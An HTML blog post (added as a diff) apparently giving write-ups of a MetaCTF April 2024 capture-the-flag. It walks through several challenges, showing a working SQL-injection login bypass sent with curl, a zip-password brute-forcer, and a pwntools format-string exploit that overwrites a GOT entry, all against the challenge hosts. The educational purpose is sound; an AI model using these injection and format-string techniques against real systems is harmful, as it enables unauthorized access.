@@ -1,0 +1,295 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link href="https://blog.psypherpunk.io/css/bootstrap.min.css" rel="stylesheet">
+        <link href="https://blog.psypherpunk.io/css/blog.css" rel="stylesheet">
+        
+        <link rel="alternate" type="application/rss+xml" title="RSS" href="https://blog.psypherpunk.io/rss.xml">
+        
+        <script src="https://kit.fontawesome.com/80cf39a0f7.js" crossorigin="anonymous"></script>
+        <title>️🏴 MetaCTF April 2024 Flash CTF</title>
+    </head>
+    <body>
+        <nav class="navbar navbar-expand-lg fixed-top navbar-dark bg-primary">
+    <div class="container">
+        <a class="navbar-brand" href="/">psypherpunk::blog</a>
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle links">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbar-collapse">
+            <ul class="navbar-nav ms-auto text-end">
+                <li class="nav-item">
+                    <a class="nav-link" href="/tags"><i class="fa fa-hashtag"></i> tags</a>
+                </li>
+                <li class="nav-item">
+                    <a target="_blank" rel="noopener" class="nav-link" href="https://github.com/psypherpunk"><i class="fa fa-github"></i> GitHub</a>
+                </li>
+                <li class="nav-item">
+                    <a target="_blank" rel="noopener" class="nav-link" href="https://twitter.com/psypherpunk"><i class="fa fa-twitter"></i> Twitter</a>
+                </li>
+                <li class="nav-item">
+                    <a target="_blank" rel="noopener" class="nav-link" href="https://bsky.app/profile/psypherpunk.io"><i class="fa-brands fa-bluesky"></i> Bluesky</a>
+                </li>
+                <li class="nav-item">
+                    <a target="_blank" rel="me noopener" class="nav-link" href="https://hachyderm.io/@psypherpunk"><i class="fa-brands fa-mastodon"></i> Mastodon</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+
+        <main class="container">
+            
+    <h1 class="title">
+        ️🏴 MetaCTF April 2024 Flash CTF
+    </h1>
+    <blockquote>A monthly mini CTF competition organized by MetaCTF and Antisyphon.</blockquote>
+    <p class="subtitle text-end"><strong>2024-04-26</strong></p>
+    
+        <p class="text-end">
+            <small class="tag">
+                
+                    <a href="https://blog.psypherpunk.io/tags/ctf/" >
+                        #ctf
+                    </a>
+                
+            </small>
+        </p>
+    
+    <h2 id="architecture-astronaut">Architecture Astronaut</h2>
+<blockquote>
+<p><em>We recovered
+<a href="https://metaproblems.com/d36b89698928224c03f29aa2d2cb5544/astronaut">this executable</a>
+from a device, but we can't figure out how to make the program run. We
+suspect the code was compiled for a system with a different CPU architecture.</em></p>
+<p><em>Can you figure out which architecture it was compiled for? The flag is the
+name of the architecture. You don't need to run or take apart the
+executable.</em></p>
+<p><em>The flag is not in <code>MetaCTF{}</code> format, it's just the name of the
+architecture. You only have 10 attempts on this challenge.</em></p>
+</blockquote>
+<p>This was straightforward enough; inquiring what the <code>file</code> type was:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">❯</span><span> file astronaut
+</span><span style="color:#bf616a;">astronaut:</span><span> ELF 32-bit LSB executable, Tensilica Xtensa, version 1 (SYSV)</span><span style="color:#bf616a;">,</span><span> statically linked, with debug_info, not stripped
+</span></code></pre>
+<p>…and the flag is <code>Tensilica Xtensa</code>.</p>
+<h2 id="login-query">Login Query</h2>
+<blockquote>
+<p><em>I'm trying to
+<a href="http://host5.metaproblems.com:7600/">log into my online crypto wallet</a>, but
+I forgot my password! There's no password reset feature, and I can't reach
+support.</em></p>
+<p><em>Can you help me log in and get the flag? My username is <code>jim404</code>.</em></p>
+<p><em>You can
+<a href="https://metaproblems.com/733443b1178118f62dbf17f03cde09f3/cryptowallet.zip">download the source code here</a>.
+Looks like there might be an issue with how the user input is injected into
+the SQL query.</em></p>
+<p><em>Update, if the link above doesn't work, you can try these as well. Please do
+not use automated tools against this challenge!</em></p>
+<ul>
+<li><em><a href="http://host5.metaproblems.com:7600/">http://host5.metaproblems.com:7600/</a></em></li>
+<li><em><a href="http://host5.metaproblems.com:7601/">http://host5.metaproblems.com:7601/</a></em></li>
+<li><em><a href="http://host5.metaproblems.com:7602/">http://host5.metaproblems.com:7602/</a></em></li>
+<li><em><a href="http://host5.metaproblems.com:7603/">http://host5.metaproblems.com:7603/</a></em></li>
+</ul>
+</blockquote>
+<p>I'll hold up my hand and admit: I <em>did</em> use <code>sqlmap</code> originally so I'm probably
+partly to blame for the addition of that last clause. Moving swiftly along…</p>
+<p>The login pages referenced above are handled by this part of the provided code:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>@app.</span><span style="color:#bf616a;">route</span><span>(&#39;</span><span style="color:#a3be8c;">/login</span><span>&#39;, </span><span style="color:#bf616a;">methods</span><span>=[&#39;</span><span style="color:#a3be8c;">POST</span><span>&#39;])
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">login</span><span>():
+</span><span>    data = request.json
+</span><span>    username = data.</span><span style="color:#bf616a;">get</span><span>(&quot;</span><span style="color:#a3be8c;">username</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">-</span><span>&quot;)
+</span><span>    password_hash = hashlib.</span><span style="color:#bf616a;">md5</span><span>(data.</span><span style="color:#bf616a;">get</span><span>(&quot;</span><span style="color:#a3be8c;">password</span><span>&quot;, &quot;</span><span style="color:#a3be8c;">-</span><span>&quot;).</span><span style="color:#bf616a;">encode</span><span>()).</span><span style="color:#bf616a;">hexdigest</span><span>()
+</span><span>
+</span><span>    db_error = &quot;&quot;
+</span><span>    </span><span style="color:#b48ead;">try</span><span>:
+</span><span>        query = &quot;</span><span style="color:#b48ead;">SELECT</span><span style="color:#a3be8c;"> username, public_btc_address, private_btc_key, balance </span><span style="color:#b48ead;">FROM</span><span style="color:#a3be8c;"> users </span><span style="color:#b48ead;">WHERE</span><span style="color:#a3be8c;"> username</span><span>=&#39;&quot; + username + &quot;</span><span style="color:#a3be8c;">&#39; AND password_hash=&#39;</span><span>&quot; + password_hash + &quot;</span><span style="color:#a3be8c;">&#39;;</span><span>&quot;
+</span><span>        result = db_cursor.</span><span style="color:#bf616a;">execute</span><span>(query)
+</span><span>        user_data = result.</span><span style="color:#bf616a;">fetchone</span><span>()
+</span><span>    </span><span style="color:#b48ead;">except </span><span>Exception </span><span style="color:#b48ead;">as </span><span>e:
+</span><span>        user_data = </span><span style="color:#d08770;">None
+</span><span>        db_error = </span><span style="color:#bf616a;">str</span><span>(e)
+</span></code></pre>
+<p>…so this comes down to a SQL injection (also teased in the description).
+There's no indication how many users are in the database and the <code>fetchone()</code>
+will simply retrieve the <em>first</em> which match the query. The injected query must
+therefore be open enough to allow access but specific enough to retrieve the
+right user: in other words, the <code>jim404</code> username still has to be in there.</p>
+<p>Or, in short, it should evaluate to <code>…WHERE username = 'jim404' --</code>:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">❯</span><span> curl http://host5.metaproblems.com:7600/login \
+</span><span>∙</span><span style="color:#bf616a;">     --request</span><span> POST \
+</span><span>∙</span><span style="color:#bf616a;">     --header </span><span>&#39;</span><span style="color:#a3be8c;">Content-Type: application/json</span><span>&#39; \
+</span><span>∙</span><span style="color:#bf616a;">     --data-raw </span><span>$&#39;</span><span style="color:#a3be8c;">{&quot;username&quot;:&quot;jim404</span><span style="color:#96b5b4;">\&#39;</span><span style="color:#a3be8c;"> --&quot;,&quot;password&quot;:&quot;pass&quot;}</span><span>&#39;
+</span><span>{
+</span><span>  &quot;</span><span style="color:#a3be8c;">balance</span><span>&quot;</span><span style="color:#bf616a;">:</span><span> 0.05179,
+</span><span>  &quot;</span><span style="color:#a3be8c;">error</span><span>&quot;</span><span style="color:#bf616a;">:</span><span> false,
+</span><span>  &quot;</span><span style="color:#a3be8c;">message</span><span>&quot;</span><span style="color:#bf616a;">: </span><span>&quot;</span><span style="color:#a3be8c;">Login successful.</span><span>&quot;,
+</span><span>  &quot;</span><span style="color:#a3be8c;">private_btc_key</span><span>&quot;</span><span style="color:#bf616a;">: </span><span>&quot;</span><span style="color:#a3be8c;">MetaCTF{time_to_move_my_money}</span><span>&quot;,
+</span><span>  &quot;</span><span style="color:#a3be8c;">public_btc_address</span><span>&quot;</span><span style="color:#bf616a;">: </span><span>&quot;</span><span style="color:#a3be8c;">15twe3BTuB8EgZFCkCETUPkVjXBovdXeZd</span><span>&quot;,
+</span><span>  &quot;</span><span style="color:#a3be8c;">username</span><span>&quot;</span><span style="color:#bf616a;">: </span><span>&quot;</span><span style="color:#a3be8c;">jim404</span><span>&quot;
+</span><span>}
+</span></code></pre>
+<h2 id="lost-luggage">Lost Luggage</h2>
+<blockquote>
+<p><em>I need to get into
+<a href="https://metaproblems.com/d36b89698928224c03f29aa2d2cb5544/luggage.zip">this archive</a>,
+but I forgot the password for it as well. All I remember is, it's the same
+4-digit pin I used on my luggage lock...</em></p>
+</blockquote>
+<p>Come for the puzzles, stay for the Spaceballs references!</p>
+<p>My immediate thought on seeing this was the <em>monthly_backwhat</em> challenge in the
+<a href="https://blog.psypherpunk.io/bsides-london-2023/"><em>BSides London 2023</em></a> CTF I recently
+completed.</p>
+<p>Tools like <code>zip2john</code> can make short work of this but where's the fun in that?</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">import </span><span>itertools
+</span><span style="color:#b48ead;">import </span><span>string
+</span><span style="color:#b48ead;">import </span><span>zipfile
+</span><span>
+</span><span>
+</span><span>z = zipfile.</span><span style="color:#bf616a;">ZipFile</span><span>(&quot;</span><span style="color:#a3be8c;">luggage.zip</span><span>&quot;)
+</span><span>
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">bruteforce</span><span>():
+</span><span>    </span><span style="color:#b48ead;">for </span><span>guess </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">10_000</span><span>):
+</span><span>        guess = </span><span style="color:#b48ead;">f</span><span>&quot;{guess</span><span style="color:#d08770;">:04</span><span>}&quot;.</span><span style="color:#bf616a;">encode</span><span>()
+</span><span>        </span><span style="color:#b48ead;">try</span><span>:
+</span><span>            z.</span><span style="color:#bf616a;">extract</span><span>(&quot;</span><span style="color:#a3be8c;">flag.txt</span><span>&quot;, </span><span style="color:#bf616a;">pwd</span><span>=guess)
+</span><span>            </span><span style="color:#b48ead;">return </span><span>guess.</span><span style="color:#bf616a;">decode</span><span>()
+</span><span>        </span><span style="color:#b48ead;">except </span><span>Exception:
+</span><span>            </span><span style="color:#d08770;">...
+</span><span>
+</span><span style="color:#96b5b4;">print</span><span>(</span><span style="color:#bf616a;">bruteforce</span><span>())
+</span></code></pre>
+<p>After a few moments:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">❯</span><span> ./lost-luggage.py
+</span><span style="color:#bf616a;">7123
+</span><span>
+</span><span style="color:#bf616a;">❯</span><span> cat flag.txt
+</span><span style="color:#bf616a;">MetaCTF{w0w_stup1d35t_c0mbin4t10n_1v3_he4rd_in_my_l1f3</span><span>}
+</span></code></pre>
+<h2 id="obnoxious-offset">Obnoxious Offset</h2>
+<blockquote>
+<p><em>Dang, I really messed up this flash drive. I should probably have my gparted
+privileges taken away.</em></p>
+<p><em>Anyways, the flag is on the second partition in
+<a href="https://metaproblems.com/d36b89698928224c03f29aa2d2cb5544/obnoxious.img">this disk image</a>.</em></p>
+</blockquote>
+<p>The <code>.img</code> file contains two partitions (a fact that took me long enough to
+figure out):</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">❯</span><span> sudo parted obnoxious.img
+</span><span style="color:#bf616a;">GNU</span><span> Parted 3.2
+</span><span style="color:#bf616a;">Using</span><span> …/metactf/obnoxious.img
+</span><span style="color:#bf616a;">Welcome</span><span> to GNU Parted! Type &#39;</span><span style="color:#a3be8c;">help</span><span>&#39; to view a list of commands.
+</span><span>(</span><span style="color:#bf616a;">parted</span><span>) u
+</span><span style="color:#bf616a;">Unit?  </span><span style="color:#b48ead;">[</span><span>compact</span><span style="color:#b48ead;">]</span><span>? B
+</span><span>(</span><span style="color:#bf616a;">parted</span><span>) print
+</span><span style="color:#bf616a;">Model:</span><span>  (file)
+</span><span style="color:#bf616a;">Disk</span><span> …/metactf/obnoxious.img: 4194304B
+</span><span style="color:#bf616a;">Sector</span><span> size (logical/physical)</span><span style="color:#96b5b4;">:</span><span> 512B/512B
+</span><span style="color:#bf616a;">Partition</span><span> Table: msdos
+</span><span style="color:#bf616a;">Disk</span><span> Flags:
+</span><span>
+</span><span style="color:#bf616a;">Number</span><span>  Start     End       Size      Type     File system  Flags
+</span><span> </span><span style="color:#bf616a;">1</span><span>      512B      2098175B  2097664B  primary  ext2         type=83
+</span><span> </span><span style="color:#bf616a;">2</span><span>      2098176B  4194303B  2098176B  primary  ext2         type=83
+</span></code></pre>
+<p>There's probably an easy way to mount each individually but instead, extracting
+just the one of interest:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">❯</span><span> dd if=obnoxious.img skip=2098176 of=obnoxious.img2 bs=1
+</span><span style="color:#bf616a;">2096128+0</span><span> records in
+</span><span style="color:#bf616a;">2096128+0</span><span> records out
+</span><span style="color:#bf616a;">2096128</span><span> bytes (2.1 MB, 2.0 MiB) </span><span style="color:#bf616a;">copied,</span><span> 7.66525 s, 273 kB/s
+</span></code></pre>
+<p>…which can be mounted with <code>sudo mount -o loop,ro ./obnoxious.img2 img/</code>.</p>
+<p>The resulting, mounted directory contains a <em>lot</em> of directories, including:
+<code>img/M/e/t/a/C/T/F/{/i/t/s/_/a/_/p/a/r/t/1/t/i/0/n/_/t/4/b/l/3/_/p/4/r/t/y/}</code>.</p>
+<p>That's the flag, minus the separators:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>&gt;&gt;&gt; </span><span style="color:#96b5b4;">print</span><span>(&quot;</span><span style="color:#a3be8c;">M/e/t/a/C/T/F/{/i/t/s/_/a/_/p/a/r/t/1/t/i/0/n/_/t/4/b/l/3/_/p/4/r/t/y/}</span><span>&quot;.</span><span style="color:#bf616a;">replace</span><span>(&quot;</span><span style="color:#a3be8c;">/</span><span>&quot;, &quot;&quot;))
+</span><span>MetaCTF{its_a_part1ti0n_t4bl3_p4rty}
+</span></code></pre>
+<h2 id="internet-talk">Internet Talk</h2>
+<blockquote>
+<p><em>Check out my l33t speak converter. It helps me talk like an internet nerd.</em></p>
+<p><em>Connect via <code>nc host5.metaproblems.com 5040</code></em></p>
+<p>You can
+<a href="https://metaproblems.com/3a748d8f30934d364f879117010fcbe4/leet">download the binary here</a>._</p>
+</blockquote>
+<p>My first port of call for binary exploitation is usually
+<a href="https://dogbolt.org/"><em>Decompiler Explorer</em></a>, which displays decompiled output
+from a variety of programs.</p>
+<p>There are two major things of note:</p>
+<ol>
+<li>the <code>main()</code> function is calling <code>printf()</code> using user-provided input and
+seemingly no second argument: an
+<a href="https://en.wikipedia.org/wiki/Uncontrolled_format_string"><em>Uncontrolled format string</em></a>.</li>
+<li>the flag is in a second function (<code>angr</code> identifies this as function
+<code>sub_80491f6()</code>, so it's at offset <code>0x80491f6</code>) which is never explicitly
+called.</li>
+</ol>
+<p>Taking a lead from that referenced article and entering a series of <code>%x</code> values
+(adding a <code>.</code> to better view the output) as the input:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">❯</span><span> nc host5.metaproblems.com 5040
+</span><span style="color:#bf616a;">Enter</span><span> a string to leet speakify:
+</span><span>%</span><span style="color:#bf616a;">x.</span><span>%</span><span style="color:#bf616a;">x.</span><span>%</span><span style="color:#bf616a;">x.</span><span>%</span><span style="color:#bf616a;">x.</span><span>%</span><span style="color:#bf616a;">x.</span><span>%</span><span style="color:#bf616a;">x.</span><span>%</span><span style="color:#bf616a;">x.</span><span>%</span><span style="color:#bf616a;">x.</span><span>%</span><span style="color:#bf616a;">x.</span><span>%</span><span style="color:#bf616a;">x.</span><span>%</span><span style="color:#bf616a;">x.</span><span>%</span><span style="color:#bf616a;">x.</span><span>%</span><span style="color:#bf616a;">x.</span><span>%</span><span style="color:#bf616a;">x.</span><span>%</span><span style="color:#bf616a;">x.</span><span>%</span><span style="color:#bf616a;">x.</span><span>%</span><span style="color:#bf616a;">x.</span><span>%</span><span style="color:#bf616a;">x.
+</span><span style="color:#bf616a;">Original</span><span> Input:
+</span><span>
+</span><span style="color:#bf616a;">37.20.5f.ffc916f4.ef54d780.37.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
+</span><span style="color:#bf616a;">Leet</span><span> Speak:
+</span><span>
+</span><span style="color:#bf616a;">37.20.5f.ffc916f4.ef54d780.37.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.
+</span><span style="color:#bf616a;">�
+</span></code></pre>
+<p>The 7th entry in that output is significant: <code>25</code>, <code>2e</code> and <code>78</code> are the hex
+values for <code>%</code>, <code>.</code> and <code>x</code> respectively.</p>
+<p>Thankfully <code>pwntools</code> has a function for doing exactly this:
+function—<a href="https://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload"><code>fmtstr_payload</code></a>.</p>
+<p>Firstly, determine where <code>printf</code> sits in the the Global Offset Table:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span style="color:#bf616a;">ELF
+</span><span>
+</span><span>
+</span><span>elf = </span><span style="color:#bf616a;">ELF</span><span>(&quot;</span><span style="color:#a3be8c;">./leet</span><span>&quot;)
+</span><span>printf_offset = elf.symbols[&quot;</span><span style="color:#a3be8c;">got.printf</span><span>&quot;]
+</span></code></pre>
+<p>Then generate the payload:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">from </span><span>pwn </span><span style="color:#b48ead;">import </span><span>p32
+</span><span style="color:#b48ead;">from </span><span>pwnlib.fmtstr </span><span style="color:#b48ead;">import </span><span>fmtstr_payload
+</span><span>
+</span><span>
+</span><span>flag = </span><span style="color:#bf616a;">p32</span><span>(</span><span style="color:#d08770;">0x80491F6</span><span>)
+</span><span>payload = </span><span style="color:#bf616a;">fmtstr_payload</span><span>(</span><span style="color:#d08770;">7</span><span>, {printf_offset: flag})
+</span></code></pre>
+<p>Armed with that payload, throw it at the challenge:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>r = </span><span style="color:#bf616a;">remote</span><span>(&quot;</span><span style="color:#a3be8c;">host5.metaproblems.com</span><span>&quot;, </span><span style="color:#d08770;">5040</span><span>)
+</span><span>r.</span><span style="color:#bf616a;">recvuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">Enter a string to leet speakify:</span><span style="color:#96b5b4;">\n</span><span>&quot;)
+</span><span>r.</span><span style="color:#bf616a;">sendline</span><span>(payload)
+</span><span>r.</span><span style="color:#bf616a;">recvuntil</span><span>(</span><span style="color:#b48ead;">b</span><span>&quot;</span><span style="color:#a3be8c;">Leet Speak:</span><span style="color:#96b5b4;">\n</span><span>&quot;)
+</span><span>
+</span><span style="color:#96b5b4;">print</span><span>(r.</span><span style="color:#bf616a;">recvall</span><span>().</span><span style="color:#bf616a;">decode</span><span>(</span><span style="color:#bf616a;">errors</span><span>=&quot;</span><span style="color:#a3be8c;">ignore</span><span>&quot;).</span><span style="color:#bf616a;">strip</span><span>())
+</span></code></pre>
+<p>Putting that all together:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">❯</span><span> ./internet-talk.py
+</span><span style="color:#bf616a;">[*] </span><span>&#39;</span><span style="color:#a3be8c;">…/metactf/leet</span><span>&#39;
+</span><span>    </span><span style="color:#bf616a;">Arch:</span><span>     i386-32-little
+</span><span>    </span><span style="color:#bf616a;">RELRO:</span><span>    No RELRO
+</span><span>    </span><span style="color:#bf616a;">Stack:</span><span>    Canary found
+</span><span>    </span><span style="color:#bf616a;">NX:</span><span>       NX enabled
+</span><span>    </span><span style="color:#bf616a;">PIE:</span><span>      No PIE (0x8048000)
+</span><span style="color:#bf616a;">[+]</span><span> Opening connection to host5.metaproblems.com on port 5040: Done
+</span><span style="color:#bf616a;">[+]</span><span> Receiving all data: Done (22B)
+</span><span style="color:#bf616a;">[*]</span><span> Closed connection to host5.metaproblems.com port 5040
+</span><span style="color:#bf616a;">MetaCTF{1337_h@kkaR</span><span>}
+</span></code></pre>
+
+
+        </main>
+        
+        <footer class="footer py-1 bg-light">
+    <div class="container text-end">
+        <small class="text-muted">© 2024 PsypherPunk</small>
+    </div>
+</footer>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
+    </body>
+</html>
